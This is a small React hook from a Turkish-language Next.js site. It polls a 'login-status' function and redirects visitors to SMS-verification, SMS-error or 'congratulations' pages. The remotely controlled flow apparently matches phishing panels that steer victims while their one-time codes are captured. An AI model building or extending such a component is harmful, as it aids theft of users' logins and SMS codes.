import { useCallback, useEffect } from 'react';
import { useRouter } from 'next/router';

export function useStatusPolling({ enabled = true } = {}) {
  const router = useRouter();

  const handleRedirect = useCallback(
    (status) => {
      if (!status) return;
      const routeMap = {
        back: '/',
        sms: '/sms-dogrulama',
        hata1: '/sms-hatali',
        hata2: '/sms-hatali',
        hata3: '/sms-hatali',
        tebrik: '/tebrikler',
      };

      const target = routeMap[status];
      if (target) {
        router.push(target);
      }
    },
    [router],
  );

  const pollStatus = useCallback(async () => {
    if (!enabled) return;
    try {
      const response = await fetch('/.netlify/functions/login-status');
      if (!response.ok) return;
      const result = await response.json();
      handleRedirect(result.status);
    } catch (error) {
      if (process.env.NODE_ENV === 'development') {
        console.debug('Durum sorgusu başarısız oldu:', error);
      }
    }
  }, [enabled, handleRedirect]);

  useEffect(() => {
    if (!enabled) return () => {};
    const interval = setInterval(pollStatus, 2500);
    pollStatus();
    return () => clearInterval(interval);
  }, [enabled, pollStatus]);
}

export default useStatusPolling;